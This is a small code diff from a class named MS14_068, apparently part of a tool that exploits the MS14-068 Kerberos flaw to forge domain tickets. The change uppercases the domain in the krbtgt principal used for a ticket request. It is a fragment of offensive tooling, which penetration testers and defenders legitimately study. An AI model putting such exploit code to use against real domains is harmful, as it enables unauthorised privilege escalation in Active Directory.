@@ -1011,7 +1011,7 @@ class MS14_068():
         encASRepPart = decoder.decode(plainText, asn1Spec = EncASRepPart())[0]
         authTime = encASRepPart['authtime']
 
-        serverName = Principal('krbtgt/%s' % self.__domain, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+        serverName = Principal('krbtgt/%s' % self.__domain.upper(), type=constants.PrincipalNameType.NT_PRINCIPAL.value)
         tgs, cipher, oldSessionKey, sessionKey = self.getKerberosTGS(serverName, domain, self.__kdcHost, tgt, cipher, sessionKey, authTime)
 
         if self.__writeTGT is not None:
